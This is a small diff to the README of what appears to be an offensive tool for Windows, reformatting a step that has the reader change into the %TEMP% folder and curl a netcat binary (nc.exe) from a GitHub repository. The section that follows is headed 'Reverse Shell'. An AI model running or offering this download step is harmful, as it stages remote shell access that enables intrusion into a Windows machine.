@@ -25,7 +25,8 @@
 <br />
 - Move into Temp folder with Environment Variable `%TEMP%` as this helps with compatibility between Windows versions.
 
-- Fetch our Netcat version from repo with: `curl https://raw.githubusercontent.com/RAF-87/win-back-cat/main/files/nc.exe > nc.exe`
+- Fetch our Netcat version from repo with:<br />
+ `curl https://raw.githubusercontent.com/RAF-87/win-back-cat/main/files/nc.exe > nc.exe`
 <br />
 
 #### Why? - Reverse Shell
